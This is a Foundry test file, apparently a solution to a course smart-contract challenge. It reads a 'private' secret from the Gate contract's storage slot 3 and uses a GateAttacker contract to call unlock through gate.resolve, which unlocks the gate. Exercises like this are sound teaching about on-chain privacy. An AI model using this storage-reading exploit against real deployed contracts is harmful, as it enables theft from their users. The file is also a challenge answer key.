// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {console2} from "forge-std/console2.sol";

import {Gate} from "../src/Gate.sol";

contract Gate_Test is StdCheats, Test {
    Gate public gate;
    GateAttacker public attacker;

    address public myAddr;
    address public taAddr;
    bytes32 public secret;
    bytes32 public secretFromStorage;

    function setUp() public {
        // myAddr is the address of the student wallet (i.e. your address)
        // please replace it with your address
        myAddr = makeAddr("studentAddr");
        taAddr = makeAddr("taAddr");

        secret = bytes32("secret");

        vm.startPrank(taAddr);
        gate = new Gate(myAddr, secret);

        // hint: observe the storage layout of Gate
        // run `forge inspect Gate storage-layout --pretty`
        // | Name          | Type    | Slot | Offset | Bytes | Contract          |
        // |---------------|---------|------|--------|-------|-------------------|
        // | locked        | bool    | 0    | 0      | 1     | src/Gate.sol:Gate |
        // | studentWallet | address | 0    | 1      | 20    | src/Gate.sol:Gate |
        // | timestamp     | uint256 | 1    | 0      | 32    | src/Gate.sol:Gate |
        // | number1       | uint8   | 2    | 0      | 1     | src/Gate.sol:Gate |
        // | number2       | uint16  | 2    | 1      | 2     | src/Gate.sol:Gate |
        // | _secret       | bytes32 | 3    | 0      | 32    | src/Gate.sol:Gate |
        secretFromStorage = vm.load(address(gate), bytes32(uint256(3)));

        attacker = new GateAttacker(address(gate), secretFromStorage);

        // label contracts
        vm.label(address(gate), "Gate");
        vm.label(address(attacker), "GateAttacker");
    }

    function test_setUpState() public {
        console2.log(myAddr);
        console2.log(taAddr);
        assertEq(gate.studentWallet(), myAddr);
        assertEq(secretFromStorage, secret);
    }

    function test_answer() public {
        changePrank(myAddr);

        // 1. before attack
        assertEq(gate.locked(), true);
        assertEq(gate.isSolved(), false);

        attacker.attack();

        // 2. after attack
        assertEq(gate.locked(), false);
        assertEq(gate.isSolved(), true);
    }
}

contract GateAttacker {
    Gate public gate;
    address public myAddr;
    address public taAddr;
    bytes32 public secretFromStorage;

    constructor(address _gateAddr, bytes32 _secretFromStorage) {
        gate = Gate(_gateAddr);
        secretFromStorage = _secretFromStorage;
    }

    function attack() public {
        bytes memory dataForUnlock = abi.encodeWithSignature("unlock(bytes)", bytes32ToBytes(secretFromStorage));
        gate.resolve(dataForUnlock);
    }

    /// @notice bytes32 is different from bytes, so we need to convert it in order to call the function correctly
    function bytes32ToBytes(bytes32 _bytes32) pure public returns (bytes memory) {
        bytes memory bytesArray = new bytes(32);
        for (uint256 i; i < 32; i++) {
            bytesArray[i] = _bytes32[i];
        }
        return bytesArray;
    }
}
